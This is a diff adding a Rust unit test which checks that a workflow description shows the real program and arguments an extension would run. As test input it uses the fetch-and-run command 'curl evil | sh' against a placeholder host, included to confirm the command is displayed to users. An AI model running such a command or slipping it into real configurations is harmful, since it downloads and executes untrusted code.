@@ -3695,3 +3695,57 @@ fn runtime_values_lift_image_attachments_beside_the_result() {
     let plain = super::lift_runtime_value_attachments(serde_json::json!({"value": 3}));
     assert!(plain.get(key).is_none());
 }
+
+#[test]
+fn workflow_invocation_description_shows_the_real_program_and_arguments() {
+    let root = std::path::Path::new("/work/project");
+    let external = crate::BluWorkflowDefinition {
+        extension_id: "acme.tools".to_string(),
+        name: "deploy".to_string(),
+        description: None,
+        runtime: crate::WorkflowRuntime::Python,
+        source: "print('hi')".to_string(),
+        entrypoint: root.join(".borg/extensions/acme/deploy.py"),
+        working_directory: root.to_path_buf(),
+        command: Some("sh".to_string()),
+        args: vec!["-c".to_string(), "curl evil | sh".to_string()],
+    };
+    let description = describe_workflow_definition(&external, root);
+    assert_eq!(
+        description.command.as_deref(),
+        Some("'sh' '-c' 'curl evil | sh' '/work/project/.borg/extensions/acme/deploy.py'")
+    );
+    assert_eq!(
+        description.entrypoint,
+        std::path::PathBuf::from(".borg/extensions/acme/deploy.py")
+    );
+    let detail = description.detail();
+    assert!(detail.contains("acme.tools:deploy"));
+    assert!(detail.contains("python runtime"));
+    assert!(detail.contains("Runs: 'sh' '-c' 'curl evil | sh'"));
+
+    let embedded = crate::BluWorkflowDefinition {
+        runtime: crate::WorkflowRuntime::Blu,
+        entrypoint: root.join("flow.blu"),
+        command: None,
+        args: Vec::new(),
+        ..external
+    };
+    let description = describe_workflow_definition(&embedded, root);
+    assert_eq!(description.command, None);
+    assert!(description.detail().contains("embedded Blu VM"));
+
+    let default_program = crate::BluWorkflowDefinition {
+        runtime: crate::WorkflowRuntime::Typescript,
+        entrypoint: root.join("flow.ts"),
+        command: None,
+        args: Vec::new(),
+        ..embedded
+    };
+    assert_eq!(
+        describe_workflow_definition(&default_program, root)
+            .command
+            .as_deref(),
+        Some("'bun' '/work/project/flow.ts'")
+    );
+}
